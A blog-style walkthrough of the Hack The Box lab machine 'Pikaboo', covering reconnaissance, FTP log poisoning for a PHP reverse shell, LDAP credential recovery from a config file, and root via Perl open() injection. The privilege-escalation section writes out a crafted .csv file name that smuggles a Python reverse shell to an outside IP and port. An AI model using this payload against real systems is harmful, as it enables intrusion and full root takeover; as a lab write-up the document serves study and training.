---
layout: single
title: HTB - Pikaboo
excerpt: "pikaboo is a machine with hard difficulty both at the level of instruction and escalation of privileges, It has vunlerabilities such as lfi on the web side and also perl vunlerability, as well as crendential access via ldap."
date: 2021-12-04
classes: wide
header:
  teaser: /assets/images/img-pikaboo/portada.png
  teaser_home_page: true
  icon: /assets/images/img-pikaboo/
categories:
  - CTF
  - Pentest
  - web pentesting
tags:
  - Hack the box 
  - reverse shell
  - lfi 
---

pikaboo is a machine with hard difficulty both at the level of instruction and escalation of privileges, It has vunlerabilities such as lfi on the web side and also perl vunlerability, as well as crendential access via ldap.

<p align = "center">
<img src = "/assets/images/img-pikaboo/portada.png">
</p>

machine matrix:

<p align = "center">
<img src = "/assets/images/img-pikaboo/matrix.png">
</p>

First we are going to create a directory as the name of the machine and with ***mkt*** we are going to create the following directories to better locate the content.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura1.png">
</p>

mkt is a function I have defined in the ***~/.zshrc*** file.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura2.png">
</p>

First we send an icmp trace to see if we have a connection on the victim machine, and with the ttl I know this is a linux machine.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura3.png">
</p>

And in my case i have a function that is ***wichsystem*** that through the ttl reports me if it is a windows or linux machine.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura4.png">
</p>

And the ***wichsystem*** function is defined in the following path.
<p align = "center">
<img src = "/assets/images/img-pikaboo/captura5.png">
</p>

When we ping the ttl it reports 63 but this is because there are intermediate nodes.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura6.png">
</p>

## Scanning

With namp we will scan which ports are open on the victim machine so we can penetrate it heheheh XD.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura7.png">
</p>

Basically i report the scan in a grepable format because I have a function defined in the ***~/.zshrc*** called ***extractports*** that shows me the available ports in a much more elegant way and copies it to the clipboard.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura8.png">
</p>

And now we do another scan to find out the versions of the services running on the different ports.

```
# Nmap 7.91 scan initiated Thu Dec  2 00:38:35 2021 as: nmap -sCV -p21,22,80 -oN targeted 10.10.10.249
Nmap scan report for 10.10.10.249
Host is up (0.051s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f (RSA)
|   256 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 (ECDSA)
|_  256 f4:cd:6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Pikaboo
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec  2 00:38:46 2021 -- 1 IP address (1 host up) scanned in 11.11 seconds
```
As port 22 is running ftp, I check if the user ***anonymous*** is enabled, but it is not.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura9.png">
</p>

Well, as the http service has port 80, with ***whatweb*** we do a little recognition.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura10.png">
</p>

We access the website and with ***wappalyzer*** we see information, but i can see any useful information about the website.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura11.png">
</p>

And in the pokatdex section I don't see much information except that it is using an api called ***PokeApi*** that we will see it later.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura12.png">
</p>

If I go to the admin section it asks me for a username and password which we do not have the credentials at the moment.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura13.png">
</p>

And in the contact section there was a contact form and i wanted to test if the site was vunlerable to ***xss*** attacks, but apparently not.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura14.png">
</p>

Now I proceed with the fuzzing phase with ***wfuzz*** to see if there are any potential routes. And almost all the routes return me admin pages.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura15.png">
</p>

And we can do the same with ***gobuster*** which is made in go language and you know that go works well with sockets and connections.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura16.png">
</p>

And with both gobuester and wfuzz I get back the same routes that are all admin sites. And i can't access any of these pages because I need credentials.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura17.png">
</p>

As there was an ftp service that i wanted to know if it had any vulnerabilities using the searchsploit tool, but I didn't find anything interesting.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura18.png">
</p>

What I did with the ***dirsearch*** tool is to search the directories that are available on the victim machine's web site.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura19.png">
</p>

And I found an interesting route.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura20.png">
</p>

And we can see that we are viewing the status panel of the apache service.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura21.png">
</p>

Let's test what more potential routes we have through this route, and we see that there is a page through this route let's see what it is.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura22.png">
</p>

And we see that there is a dashboard and in this case the wappalyzer we do not see anything interesting. 

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura23.png">
</p>

And we see that I am logged in with a user on this page, but I can't do anything here, neither log out nor see the notifications.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura24.png">
</p>

Well, looking around the site and doing some research, it is simply a default templet that is made in boostrap.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura26.png">
</p>

Now what occurs to me is to fuzz this page to see some potential route, in this case I will use ***ffuf***. And well, we found interesting routes such as those of logs.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura28.png">
</p>

And we can see that we can view the logs of the ftp service running on port 21.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura29.png">
</p>

We are going to visualize the content better with ***curl***, and we see that there is a user that has been able to authenticate successfully through ftp that is the user ***pwnmeow***.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura30.png">
</p>

## Exploitation

Seeing this, what we are going to do is to make a reverse shell with php at the time of putting the credentials in the ftp and at the same time connect through curl. and boom!!! we have access to the machine.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura32.png">
</p>

We do a cat ***/etc/passwd*** to see the users available on the system.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura33.png">
</p>

We access in the home directory of the user pwnmeow to see if it has some type of file that interests us and we can see that we have first flag.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura34.png">
</p>

And here we can visualize the first flag that is the "user.txt".

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura35.png">
</p>

Ok and now what? the first thing I do is with ***crontab*** to see if it is running any script, and we see that there is a script that is running every second from the user ***root***.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura36.png">
</p>

We are going to see the content of this script, and we see that this script is executing another script which is the ***csvupdate***.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura37.png">
</p>

And we see that the script ***csvupdate*** is made in perl.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura38.png">
</p>

After analyzing the script several times, I found an interesting argument. After some googling I found that the open function is executable if it is defined with two arguments. 

https://stackoverflow.com/questions/26614348/perl-open-injection-prevention

https://news.ycombinator.com/item?id=3943116

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura39.png">
</p>

Before exploiting the other vulnerability, I'm going to go into the configuration folder where the ***pokeAPI*** is to see if we can find any access credentials, And well we see an interesting file which is the ***config*** file and as we know if we find configuration file that file may contain passwords and username.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura40.png">
</p>

And inside the configuration file we see that there is a file which is the ***settings.py*** let's have a look to see what it can contain.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura41.png">
</p>

And magic!!!, we see that this machine is running ldap and we see that there is a username and password.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura42.png">
</p>

OMG !! I don't remember how a user with a password was listed in ldap. nothing happens our friend google will save us. 

https://stackoverflow.com/questions/42845186/ldapsearch-with-username-and-password

And we can see that we have an encrypted password of the user *** pwnmeow ***. 

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura43.png">
</p>

We are going to decode the password in *** base64 ***. 

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura44.png">
</p>

let's check if this password works when accessing via ftp. and we see that if we can access and in this case we can access the directories. in this case I did not find any interesting file.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura45.png">
</p>

## Privilege Escalation

OK, what now? After logging in as pwnmeow user we can upload the file in one of the directories via this FTP server, We need ***.csv*** at the as to bypass the check in the payload file. Now let's create the payload as .csv file on the local machine.

```
touch "|python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.10.16.113\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")';echo .csv"
```
Ok now what we are going to do is to upload the payload in the ftp server, in my case what I have done is from my local computer create an empty file called "test" and then paste the payload specifying the ip address and the port that we are listening in netcat.

And that's it, you are the root user on the victim machine.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura46.png">
</p>

With python we are going to spawn a pseudo console.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura47.png">
</p>

And now we can see the second flag which is the ***root.txt***.

<p align = "center">
<img src = "/assets/images/img-pikaboo/captura48.png">
</p>

